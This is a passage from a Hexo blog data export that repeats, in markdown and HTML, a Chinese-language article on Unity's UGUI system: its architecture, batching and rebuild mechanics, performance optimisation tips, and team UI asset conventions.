Icon、Photo、背景原画。\nUISprite：尽量九宫格或者平铺，并且尽量复用。\nUIFrame：是一些尺寸巨大的背景框。\nPhoto：英雄形象等大尺寸图片合并图集太大，因此不会打进图集。\n\n字体大小：研发过程中确立大中小几号字体。每级再分三类，一共九种字体大小。\n\n色值表：颜色可以由美术出一张色值表，包括一种颜色的RGBA值和16进制值，方便开发人员快速定位准确颜色。颜色值可以存储在unity的颜色模板里。\n","source":"_posts/Unity/UGUI/介绍.md","raw":"---\ntitle: 1 Canvas\ndate: 2020-05-11 11:41:32\ntop: 1\ncategories:\n- UGUI\ntags:\n- UGUI\n---\n\n# UGUI 介绍\n\n* 1 Unity 原生的 UI 系统,与 NGUI 的作者是一个,但是 UGUI 有官方的加持,意思就是,UGUI 的有些代码放在了 C++ 层管理,而 NGUI 是没有代码放在 C++ 层管理的.\n* 2 UGUI,NGUI都属于游戏运行时展示的 UI; UIWidgets 属于为 APP 设计的 UI ,用于APP 展示,和游戏关系不太大;FGUI 在 Unity,Coco,UE游戏引擎上面都可以使用.\n* 3 编辑器 UI,意思就是只在 Unity 编辑器里面搭建的UI,用于帮助工具,方便使用而创建的;有一套 GUI,已逐渐不再使用,就是在OnGui()函数里写的那些东西; IMGUI 则替代了GUI原来的作用：用于游戏调试和自定义Inspector面板,目前都使用 IMGUI;UI Element是 2019 版最新的 UI 系统,替代 IMGUI 而存在的;\n* 4 UGUI,NGUI,UI Element,IMGUI,GUI,UIWidgets,FGUI都可以使用,其中UGUI,NGUI,FGUI是一类,UI Element,IMGUI,GUI是一类,UIWidgets是一类;艹,耍我们就跟耍猴子一样,这么多 UI,UI 仔都不一定能全部了解.\n\n# RectTransform\n\n* 1 Pivot 轴心的概念,在RectTransform的 Inspector 展示的效果里面,是一个小圆,在某一点上面的一个蓝色的圆,轴心是相对于当前控件本身的位置,轴心的位置会影响旋转、大小调整或缩放的结果.一般情况下,轴心是在矩形框内部的;但是也有在外部的情况,这种情况不好控制,一般是旋转使用.矩形旋转围绕的轴心点的位置，定义为矩形本身大小的一个比例。0,0 相当于左下角，而 1,1 相当于右上角。\n* 2 Anchors 锚点的概念,在RectTransform的 Inspector 展示的效果里面,是 4 个花瓣,4 个花瓣可以分开,也就是说,锚点有 4 个,锚点是相对于当前控件的父控件来描述其相对位置的.用来解决,父控件进行的变换,对子控件的影响,当父控件进行旋转、大小调整或缩放,子控件也相应的进行旋转、大小调整或缩放.\n\n# UGUI 的 C++ 层\n* 1 有些控件表面上是属于 UGUI 的,但是在 UGUI 的源码里面又找不到其核心代码,只是在 C# 层暴漏了接口.\n* 2 Canvas.cs CanvasGroup.cs CanvasRender.cs 在 UGUI 的源码里面都看不见其核心代码,Canvas里面的方法可能会在子线程中执行\n\n# UI整体介绍\n\n* 1 可视化 UI : Text(文本),Image(图像),Raw Image(原始图像),Mask(遮罩);\n* 2 事件交互 UI : 按钮 (Button),开关 (Toggle),开关组 (Toggle Group),滑动条 (Slider),滚动条 (Scrollbar),下拉选单 (Dropdown),输入字段 (Input Field),滚动矩形/滚动视图 (Scroll Rect/Scroll View);\n* 3 自动布局:布局元素,Minimum width(最小宽度);Minimum height(最小高度);Preferred width(首选/偏好的宽度);Preferred height(首选/偏好的高度);Flexible width(灵活/最大的宽度);Flexible height(灵活/最大的高度); 布局组中的布局元素大小设置的基本原则如下:1)首先分配最小大小。2)如果有足够的可用空间，则分配偏好大小。3)如果有额外的可用空间，则分配灵活大小。布局元素组件(Layout Element),内容大小适配器 (Content Size Fitter),宽高比适配器 (Aspect Ratio Fitter)\n* 4 富文本\n\n# UGUI原理介绍\n\n* 1 Canvas Batch: Canvas下的UI元素最终都会被Batch到同一个Mesh中，而在Batch前，会根据这些UI元素的材质（通常就是Atlas）以及渲染顺序进行重排，在不改变渲染结果的前提下，尽可能将相同材质的UI元素合并在同一个SubMesh中，从而把DrawCall降到最低。Batch的结果会被缓存复用，直到这个Canvas被标记为dirty。\n* 2 影响合批的因素: Unity官方的重要提示：当给定Canvas上的任何可绘制UI元素发生更改时，Canvas必须重新执行合批过程。此过程重新分析Canvas上的每个可绘制UI元素，不管它是否被修改。注意，“更改”是指影响UI元素外观的任何变动，包括修改sprite renderer的sprite、transform的position和scale、文本网格的text等。\n* 3 Canvas嵌套：Canvas可以嵌套使用，一个子Canvas下dirty的子物体不会触发父Canvas的rebuild。\n\n* 4 UI顶点属性变化会引发网格更新:       \n修改Image、Text的color属性，会改变UIVertex.color;        \n修改RectTransform的Size、Anchors、Pivot等，会改变UIVertex.position;     \n注意：在UGUI中颜色的变化是通过修改顶点色实现的，避免生成了新的DrawCall;         \n注意：UIVertex.position记录的是本地空间下的坐标;            \n\n****\n\n![重建流程](重建流程.png)\n\n* 1 该过程由CanvasUpdateRegistry监听Canvas的WillRenderCanvases（上图中1）而执行,主要是对当前标记为dirty的layout和graphic执行rebuild。\n* 2 在rebuild layout之前会对Layout rebuild queue中的元素依据它们在heiarchy中的层次进行排序（上图中的2），排列的结果是越靠近根的节点越会被优先处理。\n* 3 rebuild layout（上图中的3）,主要是执行ILayoutElement和ILayoutController接口中的方法来计算位置，Rect的大小等布局信息。\n* 4 rebulid graphic（上图中的4）,主要是调用UpdateGeometry重建网格的顶点数据（上图中5）以及调用UpdateMeterial更新CanvasRender的材质信息（上图中6）。\n* 5 为什么在rebuild layout的时候，要优先处理根节点的元素?\n\n**** \n\n合批原理            \n\n* 1 UGUI的合批规则是进行重叠检测，然后分层合并。\n* 2 第一步计算每个UI元素的层级号(类似于 NGUI 的 Depth)：如果有一个UI元素，它所占的矩形范围内，如果没有任何UI在它的底下，那么它的层级号就是0（最底下）；如果有一个UI在其底下且该UI可以和它Batch，那它的层级号与底下的UI层级一样；如果有一个UI在其底下但是无法与它Batch，那它的层级号为底下的UI的层级+1；如果有多个UI都在其下面，那么按前两种方式遍历计算所有的层级号，其中最大的那个作为自己的层级号。\n* 3 第二步合并相同层级中可以Batch的元素作为一个批次，并对批次进行排序 ：有了层级号之后，Unity会将每一层的所有元素进行一个排序（按照材质、纹理等信息），合并掉可以Batch的元素成为一个批次。经过以上排序，就可以得到一个有序的批次序列了。这时Unity会再做一个优化，即如果相邻间的两个批次正好可以Batch的话就会进行Batch。合批的Batch数据，最后会分别放在CanvasMesh的SubMesh里。\n\n# 常见问题\n开发过程中四个常见的问题        \n过多的GPU片段着色器使用率（如屏幕填充率过高）       \n过多的CPU时间开销在重建一个画布上       \n过多的CPU时间开销在生成顶点上（通常是文本）     \n过多的画布重建次数      \n\n针对这四个问题来分组介绍优化策略        \n网格重建优化策略(优化 Mesh)        \n> * 1 使用尽可能少的UI元素：在制作UI时，一定要仔细查检UI层级，删除不必要的UI元素，这样可以减少深度排序的时间以及Rebuild的时间。\n> * 2 减少Rebuild的频率：将动态UI元素（频繁改变例如顶点、alpha、坐标和大小等的元素）与静态UI元素分离出来，放到特定的Canvas中。\n> * 3 谨慎使用UI元素的active操作：因为它们会触发耗时较高的rebuild。使用 Scale 代替.\n> * 4 谨慎使用Canvas的Pixel Perfect选项：该选项的开启会导致UI元素在发生位移时，其长宽会被进行微调（为了对齐像素），从而造成layout Rebuild。（比如ScrollRect滚动时，会使得Canvas.SendWillRenderCanvas消耗较高）\n> * 5 Animator最佳用法： Animator每帧都会改变元素，即使动画中的数值没有变化，因为Animator没有空指令检查。对于仅响应事件时才变化的元素，可以自行编写代码或使用第三方补间插件。换成 DoTween\n> * 6 谨慎用Tiled类型的Image\n\n屏幕填充率优化策略(OverDraw)      \n> * 1 禁用不可见的面板：比如当打开一个系统时如果完全挡住了另外一个系统，则可以将被遮挡住的系统面板禁用。（龙与少女优化方案：通过修改Canvas对象的Layer隐藏面板。）\n> * 2 不要使用空的Image做按键响应：在Unity中Raycast使用Graphic作为基本元素来检测touch。如果使用空的image也会产生不必要的overdraw。可以实现一个只在逻辑上响应Raycast但是不参与绘制的组件即可。使用网上的 Empty4Raycast 方案\n> * 3 Polygon Mode Sprites：如果图片边缘有大片留白就会产生很多无用填充。Unity和Texture Packer目前都支持了Polygon Mode，也就是说将原来的矩形Sprite用更加紧致的Polygon来描述。\n> * 4 Image Fill Center：在Image Type选项为Sliced的情况下，不需要Fill Center的时候去掉勾选。\n\n合批优化策略(DrawCall)        \n> * 1 相同层级原则：父节点下所有子节点，尽量保持相同的层次结构。相同层级下的UI元素可以Batch.\n> * 2 Mask组件：Mask组件使用了模版缓存，Mask中的UI元素无法与外界UI元素合批，Mask组件还会额外增加2个DrawCall.\n> * 3 隐藏的Image：Image组件中sprite为空，都是占用drawcall渲染的，并且还会打断前后元素的合批。\n> * 4 Screen Space-Camera模式：一个Canvas中的任何一个UI元素只要在屏幕中，则这个Canvas中的其他UI元素即使在屏幕外DrawCall仍不会减少。\n> * 5 Hierarchy穿插重叠问题：如下图红点和Icon在不同图集中，如果红点稍微大一点，遮挡了旁边的Icon，就不能合批，须要调整Icon和红点的节点关系，4个Icons放在一个节点下，4个红点放在一个借点下。\n\n字体优化策略(Font)        \n> * 1  字体图集的重建机制：当一个新文字出现的时候，会被添加到字体图集，如果图集已经没有空余的地方，那么图集会被重建。图集会以相同的尺寸重建，打包当前激活的所有UI text组件中要显示的文字，如果发现图集尺寸不够用的时候，图集会重新扩充尺寸。\n> * 2 后备字体机制：对于字体库里没有的文字，会被放进后备字体图集里，后背字体图集会常驻内存里，不会被销毁。后备字体取自于系统自带的系统字库Arial.ttf，在发布的游戏安装包里该字库是不存在的。我们在一些Unity开发的游戏里，偶尔会发现一些生僻字的字形和其它常见文字的字形不统一。\n> * 3 Text的网格重建：Text组件被重新启用的时候，会重建Text的网格。如果含有大量的文字，会造成严重的CPU开销。\n> * 4 提前生成动态字体：准备游戏非常常用的文字集合，通过Font.RequestCharactersInTexture接口提前放入字体图集里。注意使用Font.textureRebuilt 委托，在字体图集被重新重建的时候，把我们提前准备的文字集合再次添加进去。\n> * 5 使用美术数字：游戏的分数，可以使用美术数字（精灵图片）来代替Text组件\n> * 6 谨慎使用Text的Best Fit选项：虽然这个选项可以动态的调整字体大小以适应UI布局而不会超框，但其代价是很高的，Unity会为用到的该元素所用到的所有字号生成图元保存在图集里，不但增加额外的生成时间，还会使得字体对应的图集变大。\n> * 7 减少长文本Text的变动，慎用UI/Effect：描边和阴影效果都会增大四倍的顶点数\n\n滚动视图优化策划(ScrollView)        \n> * 1  有两种方法填充滚动视图:用所有需要出现在滚动视图的元素填充滚动视图(子控件很少的情况下使用).用池处理这些元素，根据需要重新放置它们的位置(子控件很多,或者无限的情况下使用)\n> * 2 RectMask2D组件：俩种方法可以通过给滚动视图添加一个RectMask2D组件来提高性能。该组件确保在滚动视图窗口外面的滚动视图元素不会出现在可画的元素列表中，省去了该元素的batch。\n> * 3 一种简单的缓存池策略：在UI中布局中，使用带有Layout Element组件的对象占位（ Slot ）。给可见UI元素实例一个池，来填充滚动视图看可见区域，Slot作为父物体来定位。\n> * 4 基于位置的缓存池策略：通过移动布局里UI元素的RectTransforms坐标值，来排序显示位置。通常写一个自定义的滚动视图类或者写一个自定义布局组的组件。\n\n其它优化策略        \n> * 1 禁用无用的Raycast：UGUI的touch处理消耗也可能会成为性能热点。因为UGUI在默认情况下会对所有可见的Graphic组件调用raycast。对于不需要接收touch事件的grahic，一定要禁用raycast。（龙与少女为策划提供了检视的辅助脚本）\n> * 2 OverrideSorting：子Canvas中的OverrideSorting属性将会造成Graphic Raycast测试停止遍历Transform层级。\n> * 3 UI对象的坐标Z值：Z值不为零的时候会影响对象渲染顺序并不能合批。（例如：龙与少女里的阵型界面都是修改Spine的SortingOrder来实现位置排序）\n> * 4 网格开销巨大：如果出现了WaitingForJob或PutGeometryJobFence，则说明合并网格开销巨大（子线程网格合并）\n> * 5 高级技巧：对于处于选中播放动画的需求，并且所处canvas下内容比较多的情况下，可以单独把选中对象放到预先建好的动态canvas里，取消选中时再放回去。\n> * 6 CanvasGroup的使用:在窗口的GameObject上添加一个CanvasGroup，通过控制它的Alpha值来淡入或淡出整个窗口;在窗口的GameObject上添加一个CanvasGroup，通过设置它Interactable值来控制底层所有控件的交互开关;在 UI 元素或其某个父元素上放置画布组 (Canvas Group) 组件并将其 Block Raycasts 属性设置为 false 来使一个或多个 UI 元素不阻止鼠标事件。\n> * 7 使用 Profiler 以及 FrameDebug 检测\n\n# 规范\n规范化的重要性：有规范就会有约束有限制，在一个团队的角度上来讲，大家遵守同一套规范，可以避免多余的沟通，增加开发效率，是保证团队协作、项目稳定推进的利器。\n\n设计模板：根据游戏风格和类型设计几套模板：尺寸(比如大中小三套)、布局(比如左右,左中右等)、样式(一级底+二级底+三级底)等，根据游戏内容选择模板，既保持UI统一，又能方便拼UI，大概百分之九十的窗口都在这几个模板中选择。其他比如充值等需要有表现力的窗口再自由设计尺寸和布局。\n\n路径一致性：美术UI目录和客户端目录保持一致，可以很方便替换新版UI，而不会出现名字不一致，目录不一致，策划找瞎眼的情况。\n\n图片命名：可以参考功能、颜色、尺寸等特点命名，命名尽量使用英文，可以添加前缀表示所属功能，后缀也可以使用拼音。\n\n公用图集：多个面板都会用到的图片放到公用图集里面。为了减少合批的障碍，有必要的时候，需要复制公共图片到单独的面板图集里。\n\n合理的出图尺寸：可以减小硬盘大小，减少第一次导入项目时的图片序列化时间。\n\n图片分类：图片可以根据用途分为UISprite、UIFrame 、 Icon、Photo、背景原画。\nUISprite：尽量九宫格或者平铺，并且尽量复用。\nUIFrame：是一些尺寸巨大的背景框。\nPhoto：英雄形象等大尺寸图片合并图集太大，因此不会打进图集。\n\n字体大小：研发过程中确立大中小几号字体。每级再分三类，一共九种字体大小。\n\n色值表：颜色可以由美术出一张色值表，包括一种颜色的RGBA值和16进制值，方便开发人员快速定位准确颜色。颜色值可以存储在unity的颜色模板里。\n","slug":"Unity/UGUI/介绍","published":1,"updated":"2020-07-25T08:51:34.938Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d0i004e2gk778kk2zxe","content":"<h1 id=\"UGUI-介绍\"><a href=\"#UGUI-介绍\" class=\"headerlink\" title=\"UGUI 介绍\"></a>UGUI 介绍</h1><ul>\n<li>1 Unity 原生的 UI 系统,与 NGUI 的作者是一个,但是 UGUI 有官方的加持,意思就是,UGUI 的有些代码放在了 C++ 层管理,而 NGUI 是没有代码放在 C++ 层管理的.</li>\n<li>2 UGUI,NGUI都属于游戏运行时展示的 UI; UIWidgets 属于为 APP 设计的 UI ,用于APP 展示,和游戏关系不太大;FGUI 在 Unity,Coco,UE游戏引擎上面都可以使用.</li>\n<li>3 编辑器 UI,意思就是只在 Unity 编辑器里面搭建的UI,用于帮助工具,方便使用而创建的;有一套 GUI,已逐渐不再使用,就是在OnGui()函数里写的那些东西; IMGUI 则替代了GUI原来的作用：用于游戏调试和自定义Inspector面板,目前都使用 IMGUI;UI Element是 2019 版最新的 UI 系统,替代 IMGUI 而存在的;</li>\n<li>4 UGUI,NGUI,UI Element,IMGUI,GUI,UIWidgets,FGUI都可以使用,其中UGUI,NGUI,FGUI是一类,UI Element,IMGUI,GUI是一类,UIWidgets是一类;艹,耍我们就跟耍猴子一样,这么多 UI,UI 仔都不一定能全部了解.</li>\n</ul>\n<h1 id=\"RectTransform\"><a href=\"#RectTransform\" class=\"headerlink\" title=\"RectTransform\"></a>RectTransform</h1><ul>\n<li>1 Pivot 轴心的概念,在RectTransform的 Inspector 展示的效果里面,是一个小圆,在某一点上面的一个蓝色的圆,轴心是相对于当前控件本身的位置,轴心的位置会影响旋转、大小调整或缩放的结果.一般情况下,轴心是在矩形框内部的;但是也有在外部的情况,这种情况不好控制,一般是旋转使用.矩形旋转围绕的轴心点的位置，定义为矩形本身大小的一个比例。0,0 相当于左下角，而 1,1 相当于右上角。</li>\n<li>2 Anchors 锚点的概念,在RectTransform的 Inspector 展示的效果里面,是 4 个花瓣,4 个花瓣可以分开,也就是说,锚点有 4 个,锚点是相对于当前控件的父控件来描述其相对位置的.用来解决,父控件进行的变换,对子控件的影响,当父控件进行旋转、大小调整或缩放,子控件也相应的进行旋转、大小调整或缩放.</li>\n</ul>\n<h1 id=\"UGUI-的-C-层\"><a href=\"#UGUI-的-C-层\" class=\"headerlink\" title=\"UGUI 的 C++ 层\"></a>UGUI 的 C++ 层</h1><ul>\n<li>1 有些控件表面上是属于 UGUI 的,但是在 UGUI 的源码里面又找不到其核心代码,只是在 C# 层暴漏了接口.</li>\n<li>2 Canvas.cs CanvasGroup.cs CanvasRender.cs 在 UGUI 的源码里面都看不见其核心代码,Canvas里面的方法可能会在子线程中执行</li>\n</ul>\n<h1 id=\"UI整体介绍\"><a href=\"#UI整体介绍\" class=\"headerlink\" title=\"UI整体介绍\"></a>UI整体介绍</h1><ul>\n<li>1 可视化 UI : Text(文本),Image(图像),Raw Image(原始图像),Mask(遮罩);</li>\n<li>2 事件交互 UI : 按钮 (Button),开关 (Toggle),开关组 (Toggle Group),滑动条 (Slider),滚动条 (Scrollbar),下拉选单 (Dropdown),输入字段 (Input Field),滚动矩形/滚动视图 (Scroll Rect/Scroll View);</li>\n<li>3 自动布局:布局元素,Minimum width(最小宽度);Minimum height(最小高度);Preferred width(首选/偏好的宽度);Preferred height(首选/偏好的高度);Flexible width(灵活/最大的宽度);Flexible height(灵活/最大的高度); 布局组中的布局元素大小设置的基本原则如下:1)首先分配最小大小。2)如果有足够的可用空间，则分配偏好大小。3)如果有额外的可用空间，则分配灵活大小。布局元素组件(Layout Element),内容大小适配器 (Content Size Fitter),宽高比适配器 (Aspect Ratio Fitter)</li>\n<li>4 富文本</li>\n</ul>\n<h1 id=\"UGUI原理介绍\"><a href=\"#UGUI原理介绍\" class=\"headerlink\" title=\"UGUI原理介绍\"></a>UGUI原理介绍</h1><ul>\n<li><p>1 Canvas Batch: Canvas下的UI元素最终都会被Batch到同一个Mesh中，而在Batch前，会根据这些UI元素的材质（通常就是Atlas）以及渲染顺序进行重排，在不改变渲染结果的前提下，尽可能将相同材质的UI元素合并在同一个SubMesh中，从而把DrawCall降到最低。Batch的结果会被缓存复用，直到这个Canvas被标记为dirty。</p>\n</li>\n<li><p>2 影响合批的因素: Unity官方的重要提示：当给定Canvas上的任何可绘制UI元素发生更改时，Canvas必须重新执行合批过程。此过程重新分析Canvas上的每个可绘制UI元素，不管它是否被修改。注意，“更改”是指影响UI元素外观的任何变动，包括修改sprite renderer的sprite、transform的position和scale、文本网格的text等。</p>\n</li>\n<li><p>3 Canvas嵌套：Canvas可以嵌套使用，一个子Canvas下dirty的子物体不会触发父Canvas的rebuild。</p>\n</li>\n<li><p>4 UI顶点属性变化会引发网格更新:<br>修改Image、Text的color属性，会改变UIVertex.color;<br>修改RectTransform的Size、Anchors、Pivot等，会改变UIVertex.position;<br>注意：在UGUI中颜色的变化是通过修改顶点色实现的，避免生成了新的DrawCall;<br>注意：UIVertex.position记录的是本地空间下的坐标;            </p>\n</li>\n</ul>\n<hr>\n<p><img src=\"/2020/05/11/Unity/UGUI/%E4%BB%8B%E7%BB%8D/%E9%87%8D%E5%BB%BA%E6%B5%81%E7%A8%8B.png\" alt=\"重建流程\"></p>\n<ul>\n<li>1 该过程由CanvasUpdateRegistry监听Canvas的WillRenderCanvases（上图中1）而执行,主要是对当前标记为dirty的layout和graphic执行rebuild。</li>\n<li>2 在rebuild layout之前会对Layout rebuild queue中的元素依据它们在heiarchy中的层次进行排序（上图中的2），排列的结果是越靠近根的节点越会被优先处理。</li>\n<li>3 rebuild layout（上图中的3）,主要是执行ILayoutElement和ILayoutController接口中的方法来计算位置，Rect的大小等布局信息。</li>\n<li>4 rebulid graphic（上图中的4）,主要是调用UpdateGeometry重建网格的顶点数据（上图中5）以及调用UpdateMeterial更新CanvasRender的材质信息（上图中6）。</li>\n<li>5 为什么在rebuild layout的时候，要优先处理根节点的元素?</li>\n</ul>\n<hr>\n<p>合批原理            </p>\n<ul>\n<li>1 UGUI的合批规则是进行重叠检测，然后分层合并。</li>\n<li>2 第一步计算每个UI元素的层级号(类似于 NGUI 的 Depth)：如果有一个UI元素，它所占的矩形范围内，如果没有任何UI在它的底下，那么它的层级号就是0（最底下）；如果有一个UI在其底下且该UI可以和它Batch，那它的层级号与底下的UI层级一样；如果有一个UI在其底下但是无法与它Batch，那它的层级号为底下的UI的层级+1；如果有多个UI都在其下面，那么按前两种方式遍历计算所有的层级号，其中最大的那个作为自己的层级号。</li>\n<li>3 第二步合并相同层级中可以Batch的元素作为一个批次，并对批次进行排序 ：有了层级号之后，Unity会将每一层的所有元素进行一个排序（按照材质、纹理等信息），合并掉可以Batch的元素成为一个批次。经过以上排序，就可以得到一个有序的批次序列了。这时Unity会再做一个优化，即如果相邻间的两个批次正好可以Batch的话就会进行Batch。合批的Batch数据，最后会分别放在CanvasMesh的SubMesh里。</li>\n</ul>\n<h1 id=\"常见问题\"><a href=\"#常见问题\" class=\"headerlink\" title=\"常见问题\"></a>常见问题</h1><p>开发过程中四个常见的问题<br>过多的GPU片段着色器使用率（如屏幕填充率过高）<br>过多的CPU时间开销在重建一个画布上<br>过多的CPU时间开销在生成顶点上（通常是文本）<br>过多的画布重建次数      </p>\n<p>针对这四个问题来分组介绍优化策略<br>网格重建优化策略(优化 Mesh)        </p>\n<blockquote>\n<ul>\n<li>1 使用尽可能少的UI元素：在制作UI时，一定要仔细查检UI层级，删除不必要的UI元素，这样可以减少深度排序的时间以及Rebuild的时间。</li>\n<li>2 减少Rebuild的频率：将动态UI元素（频繁改变例如顶点、alpha、坐标和大小等的元素）与静态UI元素分离出来，放到特定的Canvas中。</li>\n<li>3 谨慎使用UI元素的active操作：因为它们会触发耗时较高的rebuild。使用 Scale 代替.</li>\n<li>4 谨慎使用Canvas的Pixel Perfect选项：该选项的开启会导致UI元素在发生位移时，其长宽会被进行微调（为了对齐像素），从而造成layout Rebuild。（比如ScrollRect滚动时，会使得Canvas.SendWillRenderCanvas消耗较高）</li>\n<li>5 Animator最佳用法： Animator每帧都会改变元素，即使动画中的数值没有变化，因为Animator没有空指令检查。对于仅响应事件时才变化的元素，可以自行编写代码或使用第三方补间插件。换成 DoTween</li>\n<li>6 谨慎用Tiled类型的Image</li>\n</ul>\n</blockquote>\n<p>屏幕填充率优化策略(OverDraw)      </p>\n<blockquote>\n<ul>\n<li>1 禁用不可见的面板：比如当打开一个系统时如果完全挡住了另外一个系统，则可以将被遮挡住的系统面板禁用。（龙与少女优化方案：通过修改Canvas对象的Layer隐藏面板。）</li>\n<li>2 不要使用空的Image做按键响应：在Unity中Raycast使用Graphic作为基本元素来检测touch。如果使用空的image也会产生不必要的overdraw。可以实现一个只在逻辑上响应Raycast但是不参与绘制的组件即可。使用网上的 Empty4Raycast 方案</li>\n<li>3 Polygon Mode Sprites：如果图片边缘有大片留白就会产生很多无用填充。Unity和Texture Packer目前都支持了Polygon Mode，也就是说将原来的矩形Sprite用更加紧致的Polygon来描述。</li>\n<li>4 Image Fill Center：在Image Type选项为Sliced的情况下，不需要Fill Center的时候去掉勾选。</li>\n</ul>\n</blockquote>\n<p>合批优化策略(DrawCall)        </p>\n<blockquote>\n<ul>\n<li>1 相同层级原则：父节点下所有子节点，尽量保持相同的层次结构。相同层级下的UI元素可以Batch.</li>\n<li>2 Mask组件：Mask组件使用了模版缓存，Mask中的UI元素无法与外界UI元素合批，Mask组件还会额外增加2个DrawCall.</li>\n<li>3 隐藏的Image：Image组件中sprite为空，都是占用drawcall渲染的，并且还会打断前后元素的合批。</li>\n<li>4 Screen Space-Camera模式：一个Canvas中的任何一个UI元素只要在屏幕中，则这个Canvas中的其他UI元素即使在屏幕外DrawCall仍不会减少。</li>\n<li>5 Hierarchy穿插重叠问题：如下图红点和Icon在不同图集中，如果红点稍微大一点，遮挡了旁边的Icon，就不能合批，须要调整Icon和红点的节点关系，4个Icons放在一个节点下，4个红点放在一个借点下。</li>\n</ul>\n</blockquote>\n<p>字体优化策略(Font)        </p>\n<blockquote>\n<ul>\n<li>1  字体图集的重建机制：当一个新文字出现的时候，会被添加到字体图集，如果图集已经没有空余的地方，那么图集会被重建。图集会以相同的尺寸重建，打包当前激活的所有UI text组件中要显示的文字，如果发现图集尺寸不够用的时候，图集会重新扩充尺寸。</li>\n<li>2 后备字体机制：对于字体库里没有的文字，会被放进后备字体图集里，后背字体图集会常驻内存里，不会被销毁。后备字体取自于系统自带的系统字库Arial.ttf，在发布的游戏安装包里该字库是不存在的。我们在一些Unity开发的游戏里，偶尔会发现一些生僻字的字形和其它常见文字的字形不统一。</li>\n<li>3 Text的网格重建：Text组件被重新启用的时候，会重建Text的网格。如果含有大量的文字，会造成严重的CPU开销。</li>\n<li>4 提前生成动态字体：准备游戏非常常用的文字集合，通过Font.RequestCharactersInTexture接口提前放入字体图集里。注意使用Font.textureRebuilt 委托，在字体图集被重新重建的时候，把我们提前准备的文字集合再次添加进去。</li>\n<li>5 使用美术数字：游戏的分数，可以使用美术数字（精灵图片）来代替Text组件</li>\n<li>6 谨慎使用Text的Best Fit选项：虽然这个选项可以动态的调整字体大小以适应UI布局而不会超框，但其代价是很高的，Unity会为用到的该元素所用到的所有字号生成图元保存在图集里，不但增加额外的生成时间，还会使得字体对应的图集变大。</li>\n<li>7 减少长文本Text的变动，慎用UI/Effect：描边和阴影效果都会增大四倍的顶点数</li>\n</ul>\n</blockquote>\n<p>滚动视图优化策划(ScrollView)        </p>\n<blockquote>\n<ul>\n<li>1  有两种方法填充滚动视图:用所有需要出现在滚动视图的元素填充滚动视图(子控件很少的情况下使用).用池处理这些元素，根据需要重新放置它们的位置(子控件很多,或者无限的情况下使用)</li>\n<li>2 RectMask2D组件：俩种方法可以通过给滚动视图添加一个RectMask2D组件来提高性能。该组件确保在滚动视图窗口外面的滚动视图元素不会出现在可画的元素列表中，省去了该元素的batch。</li>\n<li>3 一种简单的缓存池策略：在UI中布局中，使用带有Layout Element组件的对象占位（ Slot ）。给可见UI元素实例一个池，来填充滚动视图看可见区域，Slot作为父物体来定位。</li>\n<li>4 基于位置的缓存池策略：通过移动布局里UI元素的RectTransforms坐标值，来排序显示位置。通常写一个自定义的滚动视图类或者写一个自定义布局组的组件。</li>\n</ul>\n</blockquote>\n<p>其它优化策略        </p>\n<blockquote>\n<ul>\n<li>1 禁用无用的Raycast：UGUI的touch处理消耗也可能会成为性能热点。因为UGUI在默认情况下会对所有可见的Graphic组件调用raycast。对于不需要接收touch事件的grahic，一定要禁用raycast。（龙与少女为策划提供了检视的辅助脚本）</li>\n<li>2 OverrideSorting：子Canvas中的OverrideSorting属性将会造成Graphic Raycast测试停止遍历Transform层级。</li>\n<li>3 UI对象的坐标Z值：Z值不为零的时候会影响对象渲染顺序并不能合批。（例如：龙与少女里的阵型界面都是修改Spine的SortingOrder来实现位置排序）</li>\n<li>4 网格开销巨大：如果出现了WaitingForJob或PutGeometryJobFence，则说明合并网格开销巨大（子线程网格合并）</li>\n<li>5 高级技巧：对于处于选中播放动画的需求，并且所处canvas下内容比较多的情况下，可以单独把选中对象放到预先建好的动态canvas里，取消选中时再放回去。</li>\n<li>6 CanvasGroup的使用:在窗口的GameObject上添加一个CanvasGroup，通过控制它的Alpha值来淡入或淡出整个窗口;在窗口的GameObject上添加一个CanvasGroup，通过设置它Interactable值来控制底层所有控件的交互开关;在 UI 元素或其某个父元素上放置画布组 (Canvas Group) 组件并将其 Block Raycasts 属性设置为 false 来使一个或多个 UI 元素不阻止鼠标事件。</li>\n<li>7 使用 Profiler 以及 FrameDebug 检测</li>\n</ul>\n</blockquote>\n<h1 id=\"规范\"><a href=\"#规范\" class=\"headerlink\" title=\"规范\"></a>规范</h1><p>规范化的重要性：有规范就会有约束有限制，在一个团队的角度上来讲，大家遵守同一套规范，可以避免多余的沟通，增加开发效率，是保证团队协作、项目稳定推进的利器。</p>\n<p>设计模板：根据游戏风格和类型设计几套模板：尺寸(比如大中小三套)、布局(比如左右,左中右等)、样式(一级底+二级底+三级底)等，根据游戏内容选择模板，既保持UI统一，又能方便拼UI，大概百分之九十的窗口都在这几个模板中选择。其他比如充值等需要有表现力的窗口再自由设计尺寸和布局。</p>\n<p>路径一致性：美术UI目录和客户端目录保持一致，可以很方便替换新版UI，而不会出现名字不一致，目录不一致，策划找瞎眼的情况。</p>\n<p>图片命名：可以参考功能、颜色、尺寸等特点命名，命名尽量使用英文，可以添加前缀表示所属功能，后缀也可以使用拼音。</p>\n<p>公用图集：多个面板都会用到的图片放到公用图集里面。为了减少合批的障碍，有必要的时候，需要复制公共图片到单独的面板图集里。</p>\n<p>合理的出图尺寸：可以减小硬盘大小，减少第一次导入项目时的图片序列化时间。</p>\n<p>图片分类：图片可以根据用途分为UISprite、UIFrame 、 Icon、Photo、背景原画。<br>UISprite：尽量九宫格或者平铺，并且尽量复用。<br>UIFrame：是一些尺寸巨大的背景框。<br>Photo：英雄形象等大尺寸图片合并图集太大，因此不会打进图集。</p>\n<p>字体大小：研发过程中确立大中小几号字体。每级再分三类，一共九种字体大小。</p>\n<p>色值表：颜色可以由美术出一张色值表，包括一种颜色的RGBA值和16进制值，方便开发人员快速定位准确颜色。颜色值可以存储在unity的颜色模板里。</p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"UGUI-介绍\"><a href=\"#UGUI-介绍\" class=\"headerlink\" title=\"UGUI 介绍\"></a>UGUI 介绍</h1><ul>\n<li>1 Unity 原生的 UI 系统,与 NGUI 的作者是一个,但是 UGUI 有官方的加持,意思就是,UGUI 的有些代码放在了 C++ 层管理,而 NGUI 是没有代码放在 C++ 层管理的.</li>\n<li>2 UGUI,NGUI都属于游戏运行时展示的 UI; UIWidgets 属于为 APP 设计的 UI ,用于APP 展示,和游戏关系不太大;FGUI 在 Unity,Coco,UE游戏引擎上面都可以使用.</li>\n<li>3 编辑器 UI,意思就是只在 Unity 